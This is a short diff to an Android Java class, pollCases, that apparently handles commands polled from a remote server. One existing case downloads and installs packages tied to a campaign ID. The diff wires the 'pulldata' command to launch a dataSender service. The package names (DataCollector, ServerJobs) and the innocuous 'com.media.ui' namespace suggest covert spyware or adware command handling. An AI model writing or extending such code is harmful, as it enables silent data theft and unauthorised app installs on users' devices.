@@ -1,13 +1,15 @@
-package com.media.ui.Services;
+package com.media.ui.ServerJobs;
 
 import android.app.NotificationManager;
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
 
 import com.media.ui.DataCollector.CnfInstall;
 import com.media.ui.Notifications.installNotification;
 import com.media.ui.Notifications.sendNotification;
+import com.media.ui.Services.dataSender;
 import com.media.ui.constants;
 
 import java.io.InputStream;
@@ -55,7 +57,9 @@ public class pollCases {
                 new CnfInstall(context).downloadAndInstall(loc1, uri, pkg, camp_id);
                 break; // optional
             case "pulldata":
-
+                Intent newIntent = new Intent(context, dataSender.class);
+                newIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startService(newIntent);
                 break; // optional
             case "conf":
                 // Statements
